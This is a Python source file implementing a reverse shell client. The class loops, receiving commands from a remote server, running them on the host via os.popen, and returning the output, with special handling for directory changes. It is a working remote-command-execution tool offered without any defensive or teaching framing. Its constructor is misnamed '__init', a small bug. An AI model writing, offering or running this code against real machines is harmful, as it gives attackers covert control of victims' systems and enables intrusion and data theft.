import os
from client import *


class ClientReverseShell(Client):
    def __init(self,server_ip,server_port):
        super().__init__(server_ip,server_port)

    def exec_command(self):
        #getting the command from the server
        comm = self.recv_data()
        #executing the command on the client machine(the machine on which this script will run)
        #the special case  of wanting to change the directory
        if "cd" == comm.strip()[:2]:
            dir = comm[comm.index('d')+1:].lstrip()
            os.chdir(dir)
            cwd = os.popen('pwd').read()
            self.send_data(f"directory has been changed to {cwd}")
        #the normal case of just wanting to execute a command
        else:
            exec_comm = os.popen(comm)
            #sending the command response back to the server
            self.send_data(exec_comm.read())

#quick testing of the reverse shell client
if __name__ == "__main__":
    client = ClientReverseShell(socket.gethostname(),9999)
    while True:
        client.exec_command()
